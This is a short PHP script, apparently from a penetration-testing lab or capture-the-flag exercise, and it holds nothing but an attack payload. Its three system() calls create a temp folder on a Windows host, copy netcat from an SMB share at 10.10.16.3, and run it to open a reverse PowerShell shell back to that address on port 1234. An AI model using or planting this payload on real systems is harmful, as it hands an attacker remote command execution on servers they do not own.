<?php 
 system('mkdir c:\\tmp');
 system('copy \\\\10.10.16.3\\share\\nc64.exe c:\\tmp\\nc.exe');
 system('c:\\tmp\\nc.exe 10.10.16.3 1234 -e powershell.exe');
?>
